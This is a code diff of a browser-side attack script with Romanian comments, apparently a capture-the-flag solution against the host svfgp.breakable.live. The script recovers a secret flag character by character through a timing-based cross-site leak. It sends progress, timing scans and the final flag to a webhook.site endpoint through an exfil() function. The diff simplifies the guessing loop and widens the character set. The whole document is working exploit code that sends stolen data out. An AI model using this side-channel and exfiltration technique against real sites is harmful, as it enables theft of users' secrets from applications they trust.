@@ -6,15 +6,11 @@
 const TARGET = "https://svfgp.breakable.live/";
 const WEBHOOK = "https://webhook.site/94b9dd09-33f5-41af-b252-d0649bda60af";
 
-// schimbă doar prefixul ăsta după fiecare rundă
-let prefix = "CTF{";
+// pune aici ultimul prefix VALID primit in progress:
+let prefix = "CTF{139";
 
-// charset mai larg, ca să nu ratăm simboluri
-const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
-
-const ROUND_TIMEOUT = 14000;
-const TOP_CANDIDATES = 3;   // păstrăm primii 3 pentru reverificare
-const VERIFY_ROUNDS = 2;    // câte runde extra de confirmare facem
+const CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}"\'*.-';
+const ROUND_TIMEOUT = 9000;
 
 let running = false;
 
@@ -89,46 +85,6 @@ async function runBatch(candidates, timeoutMs) {
   });
 }
 
-async function decideNextChar() {
-  const allCandidates = [...CHARSET].map(ch => prefix + ch);
-
-  // prima rundă: toți candidații
-  const first = await runBatch(allCandidates, ROUND_TIMEOUT);
-
-  if (!first.length) {
-    exfil("no-results-for:" + prefix);
-    return null;
-  }
-
-  exfil("scan:" + first.slice(0, 5).map(x => x.sid + ":" + Math.round(x.dt)).join("|"));
-
-  const shortlist = first.slice(0, TOP_CANDIDATES).map(x => x.sid);
-  const score = new Map();
-  for (const sid of shortlist) score.set(sid, 0);
-
-  // reverificare pe primii candidați
-  for (let i = 0; i < VERIFY_ROUNDS; i++) {
-    await sleep(300);
-    const again = await runBatch(shortlist, ROUND_TIMEOUT);
-    if (!again.length) continue;
-    const best = again[0].sid;
-    score.set(best, (score.get(best) || 0) + 1);
-    exfil("verify" + i + ":" + again.map(x => x.sid + ":" + Math.round(x.dt)).join("|"));
-  }
-
-  // alegem după scor; la egalitate, după prima rundă
-  shortlist.sort((a, b) => {
-    const sa = score.get(a) || 0;
-    const sb = score.get(b) || 0;
-    if (sb !== sa) return sb - sa;
-    const ia = first.findIndex(x => x.sid === a);
-    const ib = first.findIndex(x => x.sid === b);
-    return ia - ib;
-  });
-
-  return shortlist[0];
-}
-
 async function main() {
   if (running) return;
   running = true;
@@ -137,19 +93,28 @@ async function main() {
 
   try {
     while (!prefix.endsWith("}")) {
-      const best = await decideNextChar();
-      if (!best) break;
-      prefix = best;
+      const candidates = [...CHARSET].map(ch => prefix + ch);
+      const res = await runBatch(candidates, ROUND_TIMEOUT);
+
+      if (!res.length) {
+        exfil("no-results-for:" + prefix);
+        break;
+      }
+
+      exfil("scan:" + res.slice(0, 5).map(x => x.sid + ":" + Math.round(x.dt)).join("|"));
+
+      prefix = res[0].sid;
       exfil("progress:" + prefix);
-      await sleep(400);
+
+      await sleep(300);
     }
 
     if (prefix.endsWith("}")) {
       exfil("FLAG:" + prefix);
       document.body.textContent = "DONE: " + prefix;
     } else {
-      document.body.textContent = "STOPPED AT: " + prefix;
       exfil("stopped:" + prefix);
+      document.body.textContent = "STOPPED AT: " + prefix;
     }
   } catch (e) {
     exfil("error:" + String(e));
